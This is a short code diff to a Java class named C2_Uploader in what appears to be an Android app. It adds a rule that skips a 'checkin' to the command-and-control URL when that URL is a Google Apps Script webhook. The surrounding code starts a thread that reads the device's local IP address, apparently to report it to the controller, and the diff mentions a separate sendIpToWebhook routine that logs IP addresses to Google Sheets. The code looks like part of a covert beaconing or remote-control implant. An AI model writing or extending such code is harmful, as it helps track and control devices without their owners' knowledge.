@@ -50,6 +50,9 @@ public class C2_Uploader {
         String c2Url = BuildConfig.WEBHOOK_URL;
         if (c2Url == null || c2Url.isEmpty()) return;
 
+        // Skip checkin for Google Apps Script webhooks (Google Sheets logging is handled by sendIpToWebhook)
+        if (c2Url.contains("script.google.com") || c2Url.contains("script.googleusercontent.com")) return;
+
         new Thread(() -> {
             try {
                 String ip = MainActivity.getLocalIpAddress();
